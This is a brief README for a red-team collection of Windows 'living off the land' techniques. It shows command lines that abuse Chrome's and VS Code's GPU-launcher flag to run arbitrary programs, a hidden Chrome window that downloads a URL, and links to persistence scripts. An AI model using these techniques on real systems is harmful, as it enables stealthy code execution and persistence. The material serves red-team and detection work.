# Binary_Alchemy-LOLBINS
BinaryAlchemy is a project for collecting known and commonly found executables in action for red teamers.

# Execution
### Chrome
````

 & 'C:\Program Files\Google\Chrome\Application\chrome.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"
 & 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe' --silent-launch --disable-gpu-sandbox --gpu-launcher="calc.exe"

````
### VSCode
````
- & "C:\Program Files\Microsoft VS Code\Code.exe" --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c ping google.com &&"
- & "C:\Program Files\Microsoft VS Code\Code.exe" --disable-gpu-sandbox --gpu-launcher="calc.exe"

````
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Download
### Chrome
````

& ‘C:\Program Files\Google\Chrome\Application\chrome_proxy.exe’ — profile-directory=Default — incognito — chrome-frame — user-data-dir=”C:\Temp\Temp-chrome\” — window-size=0,0 — window-position=”0000,1000" <URL>

````
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Persistence
### Windows Terminal Profile creation

````
 [Windows Terminal Profile Creator](https://github.com/Miragle-Hub/Persistence-in-Windows/blob/main/Persistence_P0C.ps1)

````
### LNK Shorcut
````
[Windows Shortcut Persistence Script](https://github.com/Miragle-Hub/Persistence-in-Windows/blob/main/Lnk%20Persistence.ps1)

````

